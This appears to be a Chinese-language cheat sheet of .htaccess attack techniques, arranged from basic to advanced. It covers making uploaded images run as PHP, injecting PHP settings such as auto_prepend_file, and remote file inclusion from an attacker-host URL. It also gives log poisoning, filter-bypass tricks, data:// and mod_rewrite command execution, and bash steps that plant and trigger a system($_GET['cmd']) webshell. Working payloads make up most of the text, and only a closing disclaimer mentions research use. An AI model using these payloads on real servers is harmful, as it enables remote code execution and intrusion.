# .htaccess 攻击向量与安全绕过技术

本文档汇总了通过 .htaccess 文件进行攻击的技术，从基础到高级，
包括文件上传利用、PHP 配置注入以及安全过滤器绕过技术。

## 目录
- 第一部分：基础 - 文件上传利用
- 第二部分：中级 - PHP 配置注入
- 第三部分：高级 - 绕过与深度利用技术
- 第四部分：真实攻击场景
- 注意事项与免责声明

---

## 第一部分：基础 - 文件上传利用

当可以上传 .htaccess 文件但禁止上传 .php 文件时，常使用以下技术。

### 1.1 将图片文件作为 PHP 执行

示例（.htaccess）：
```apache
AddType application/x-httpd-php .jpg .png .gif .txt
```

说明：
AddType 为指定扩展名设置 PHP MIME 类型。

用途：
上传包含 PHP 代码的 shell.jpg 并直接访问执行。

效果：
绕过仅允许图片上传的过滤规则。

### 1.2 基础 SetHandler

示例：
```apache
<FilesMatch "shell\.(jpg|png|txt)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

说明：
FilesMatch 使用正则表达式匹配文件名。

### 1.3 ForceType

示例：
```apache
<Files "hack">
    ForceType application/x-httpd-php
</Files>
```

说明：
无论扩展名为何，强制以 PHP 执行。

---

## 第二部分：中级 - PHP 配置注入

通过 .htaccess 修改 PHP 运行时配置
（需要启用 AllowOverride Options 或等效权限）。

### 2.1 PHP Value 注入

技术一：auto_prepend_file

示例：
```apache
php_value auto_prepend_file "/etc/passwd"
php_value auto_prepend_file "php://input"
```

说明：
在任何 PHP 脚本执行前自动包含文件。

技术二：include_path

示例：
```apache
php_value include_path "Z:/path/with/<?php system($_GET['cmd']); ?>"
```

说明：
PHP 可能解析 include_path 中嵌入的代码。

### 2.2 远程文件包含（RFI）

示例：
```apache
php_flag allow_url_fopen On
php_flag allow_url_include On
php_value auto_prepend_file "http://attacker.com/shell.txt"
```

优势：
无需向目标服务器上传 WebShell。

### 2.3 通过 .htaccess 进行日志投毒

示例：
```apache
php_value error_log "/var/www/html/shell.php"
php_value include_path "<?php system($_GET['cmd']); ?>"
```

攻击流程：
1. 将 error_log 指向可访问文件
2. 触发包含恶意内容的错误
3. 包含被污染的日志文件实现 RCE

---

## 第三部分：高级 - 绕过与深度利用技术

### 3.1 使用换行符绕过过滤

示例：
```apache
php_value auto_prepend_fi\
le "php://input"
```

说明：
Apache 在解析时会拼接反斜杠结尾的行。

### 3.2 链式利用

示例：
```apache
php_flag allow_url_include On
php_value auto_append_file "data://text/plain;base64,PD9waHAgZWNobyAnU2hlbGwgQWN0aXZhdGVkJzsgPz4="
AddType application/x-httpd-php .phtml .phar .inc
```

### 3.3 Apache 表达式与 Header 注入

示例：
```apache
<If "%{REQUEST_URI} =~ /test/">
    Header set X-Powered-By "<?php system('id'); ?>"
</If>
```

### 3.4 Mod_Rewrite 利用

示例：
```apache
RewriteEngine On
RewriteCond %{QUERY_STRING} ^cmd=(.*)$
RewriteRule ^.*$ - [E=CMD:%1]

<If "%{ENV:CMD} != ''">
    php_value auto_prepend_file "data://text/plain,<?php system(getenv('CMD')); ?>"
</If>
```

### 3.5 嵌套 .htaccess（双层）

示例：
```apache
<Files ".hidden">
    ForceType application/x-httpd-php
</Files>
```

---

## 第四部分：真实攻击场景

场景一：上传 .htaccess + Shell

步骤：
```bash
echo 'AddType application/x-httpd-php .jpg' > .htaccess
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl 'http://target.com/uploads/shell.jpg?cmd=id'
```

场景二：日志投毒

步骤：
```bash
curl 'http://target.com/?page=non_existent'
curl 'http://target.com/poison.php?c=whoami'
```

---

## 注意事项与免责声明

注意：
- 需要对 .htaccess 有写权限
- 目录必须允许 Override
- 常与文件上传漏洞结合使用

免责声明：
本文档仅用于安全研究与教育目的。
未经授权的使用是违法行为。
